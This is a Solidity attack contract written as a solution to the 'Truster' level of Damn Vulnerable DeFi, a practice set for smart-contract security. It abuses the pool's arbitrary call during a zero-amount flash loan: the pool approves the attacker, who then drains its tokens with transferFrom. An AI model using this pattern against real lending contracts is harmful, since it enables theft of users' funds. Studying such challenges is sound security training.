// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "../truster/TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title AttackTruster
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract AttackTruster {

    TrusterLenderPool private immutable pool;
    address private immutable owner;

    constructor(address poolAddress) {
        pool = TrusterLenderPool(poolAddress);
        owner = msg.sender;
    }
    
    function executeFlashLoan(address token, uint256 amount) external {
        require(msg.sender == owner, "Only owner can execute flash loan");
        bytes memory data = abi.encodeWithSignature('approve(address,uint256)', address(this), amount); // FIXME:
        pool.flashLoan(0, address(this), token, data); 
        console.log(
            "Allowance for this contract:",
            IERC20(token).allowance(address(pool), address(this))
        );
        IERC20(token).transferFrom(address(pool), msg.sender, amount);
    }
}